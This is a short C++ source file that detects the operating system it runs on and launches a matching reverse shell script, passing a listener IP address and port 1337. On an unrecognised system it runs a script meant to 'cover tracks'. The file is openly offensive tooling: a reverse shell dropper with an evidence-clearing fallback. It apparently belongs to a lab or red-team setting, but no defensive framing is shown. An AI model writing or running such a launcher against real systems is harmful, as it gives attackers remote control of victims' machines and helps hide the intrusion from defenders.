// dont forget to compile this with "g++ COSDetect.cpp -o COSDetect".
// it can then be run with ./COSDetect

#include <iostream>
#include <cstdlib>
#include <string>

int main() {
    // define arguments to as well as script names as variables here
    std::string ip = " -I 192.168.13.37 "; // argument for -I parameter
    std::string port = " -P 1337"; // argument for -P parameter

    std::string arguments = ip + port;
    
    std::string winScript = "./winRevShell.sh" + arguments;
    std::string macScript = "./macRevShell.sh" + arguments;
    std::string linuxScript = "./linuxRevShell.sh" + arguments;
    std::string abortTracks = "./clearTracks.sh";

    #ifdef _WIN32
        std::cout << "Running on Windows" << std::endl; // run windows script if windows, mac if mac, etc.
        std::system(winScript.c_str());
    #elif __APPLE__
        std::cout << "Running on macOS" << std::endl;
        std::system(macScript.c_str());
    #elif __linux__
        std::cout << "Running on Linux" << std::endl;
        std::system(linuxScript.c_str());
    #else
        std::cout << "Unknown OS. Attempting to cover tracks..." << std::endl; // if OS is none of those, then run abortTracks or whatever you need
        std::system(abortTracks.c_str());
    #endif

    return 0;
}
